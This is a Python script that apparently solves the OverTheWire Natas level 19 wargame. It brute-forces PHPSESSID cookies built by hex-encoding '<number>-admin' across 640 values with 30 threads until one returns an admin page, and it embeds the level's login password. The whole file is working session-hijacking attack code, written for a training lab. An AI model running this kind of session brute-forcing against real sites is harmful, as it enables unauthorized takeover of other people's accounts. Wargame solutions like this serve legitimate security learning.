import requests
import concurrent.futures

def get_page_text(session_num):
	print('\tTrying session "{0}..."'.format(session_num))
	r = requests.get(
		"http://natas19.natas.labs.overthewire.org",
		auth= ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"),
		cookies={"PHPSESSID": "".join([str(session_num), "-admin"]).encode("hex")})
	if "You are an admin." in r.text:
		print('\nAdmin session: %d', session_num)
		print(r.text)
		exit(0)


def main():
	with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
		executor.map(get_page_text, range(640))

if __name__ == "__main__":
	main()